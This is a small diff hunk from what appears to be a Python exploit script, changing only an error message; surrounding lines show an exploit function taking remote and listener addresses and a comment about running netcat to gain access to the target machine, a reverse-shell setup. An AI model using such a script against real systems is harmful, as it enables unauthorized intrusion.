@@ -37,7 +37,7 @@ def exploit(rhost, rport, lhost, lport):
         sock.close()
 
     except Exception as e:
-        print(f"[!] An error occurred: {e}")
+        print(f"An error occurred: {e}")
         sys.exit(1)
 
 # We want to run netcat in another terminal so that we have access to the targeted machine once we exploit it
